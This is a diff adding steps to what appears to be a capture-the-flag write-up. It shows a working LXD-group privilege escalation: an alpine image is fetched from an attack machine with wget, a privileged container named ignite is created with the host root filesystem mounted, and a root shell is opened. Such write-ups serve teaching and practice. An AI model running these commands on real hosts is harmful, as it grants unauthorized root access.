@@ -374,7 +374,7 @@ $ python3 -m http.server
 
 I am grabbing an alpine image and then starting a python http server so that the target box can download the alpine image.
 
-Now I am going to download what I need from attack machine onto the target machine. Here are the command I used:
+Now I am going to download what I need from attack machine onto the target machine. I move to the /tmp directory since I have read and write permissions there. Here is the command I used:
 
 ```bash
 $ wget http://<attack_machine_ip>:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
@@ -390,4 +390,39 @@ I check to make sure it got added, by running the following command:
 
 ```bash
 $ lxc image list
+```
+
+I need to mark that image with privilege escalation. So I create a container called ignite and give it escalated privileges. I run the following:
+
+```bash
+$ lxc init myimage ignite -c security.privileged=true
+```
+
+Now I have a container named ignite. I wasn to mount my hard drive to that container. I name the mount mydevice. Here is the command I ran:
+
+```bash
+$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+```
+
+This means that I can see the target hard drive in the container when I go to the /mnt/root/ directory. In other words, the /mnt/root directory in the container will be the / directory on the target machine.
+
+Now I start the ignite container with the following command:
+
+```bash
+$ lxc start ignite
+```
+
+I log into the machine with a shell using the following command:
+
+```bash
+$ lxc exec ignite /bin/sh
+```
+
+## What is the name of the file in the /root directory?
+
+It worked. I'm in! The cursor changed to the # character to let me know that I am root. I ran the following commands to see the files in the root directory:
+
+```bash
+# ls -l /mnt/root/root
+REDACTED
 ```
